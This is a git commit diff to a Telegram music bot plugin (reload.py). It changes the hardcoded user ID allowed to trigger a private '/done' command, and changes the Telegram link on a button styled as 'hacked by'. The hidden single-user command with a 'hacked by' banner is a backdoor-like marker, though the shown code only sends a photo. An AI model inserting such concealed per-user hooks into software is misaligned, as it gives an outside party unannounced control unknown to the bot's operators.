fc2a6f34fa8c527546b48e10eb0b7d102cb4767b
jassbots <157136102+jassbots@users.noreply.github.com>
2024-03-02 09:32:07 +0530

    Update reload.py

--- DAXXMUSIC/plugins/tools/reload.py
+++ DAXXMUSIC/plugins/tools/reload.py
@@ -108,7 +108,7 @@ async def restartbot(client, message: Message, _):
 @app.on_message(
     filters.command("done")
     & filters.private
-    & filters.user(6664582540)
+    & filters.user(6180225412)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
@@ -118,7 +118,7 @@ async def help(client: Client, message: Message):
              [
                  [
                       InlineKeyboardButton(
-                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/iam_daxx")
+                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/unknown_bande")
                  ]
             ]
          ),
